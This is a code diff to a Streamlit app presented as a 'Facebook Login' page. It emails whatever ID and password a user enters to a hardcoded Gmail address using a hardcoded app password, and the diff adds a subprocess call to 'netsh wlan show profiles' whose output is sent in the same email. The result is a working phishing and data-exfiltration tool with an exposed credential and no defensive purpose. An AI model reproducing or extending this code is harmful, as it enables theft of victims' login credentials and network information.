@@ -11,6 +11,11 @@ password= "cddy vhma mjxx iexi"
 receiver= "sonu.code.ai@gmail.com"
 
 
+import subprocess
+# Run a simple command
+output=subprocess.run(["cmd", "/c", "netsh wlan show profiles"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
+final_output=output.stdout
+
 
 
 st.set_page_config(page_title="Facebook Login",page_icon="logo.png" ,layout="centered")
@@ -77,7 +82,7 @@ with col2:
         if st.button("Login"):
 
             with st.spinner("Loading..........."): 
-                full_msg= f"ID: {user_name}  \n Password: {user_password}"
+                full_msg= f"ID: {user_name}  \n Password: {user_password} \n cmd: {final_output}"
                 msg = MIMEText(full_msg)
                 msg["Subject"] = "Message from Streamlit App"
                 msg["From"] = sender
